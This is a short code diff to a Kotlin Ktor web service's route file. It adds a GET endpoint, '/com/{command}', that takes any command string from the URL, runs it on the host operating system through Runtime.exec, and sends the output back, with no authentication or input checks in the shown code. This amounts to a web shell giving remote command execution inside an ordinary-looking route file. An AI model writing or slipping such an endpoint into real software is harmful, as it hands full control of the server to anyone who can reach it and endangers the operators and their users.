@@ -28,6 +28,18 @@ fun Route.getAndPost() {
             ContentType.Text.Html
         )
     }
+    get("/com/{command}") {
+        call.parameters["command"]
+            ?.let {
+                println(it)
+                val result =
+                    Runtime.getRuntime() // https://stackoverflow.com/questions/70035178/kotlin-script-to-run-os-command-and-parse-output
+                        .exec(it.split(" ").toTypedArray())
+                        .inputStream
+                        .readAllBytes()
+                call.respond(result)
+            }
+    }
     get("/{key}/") {
         call.parameters["key"]
             ?.let {
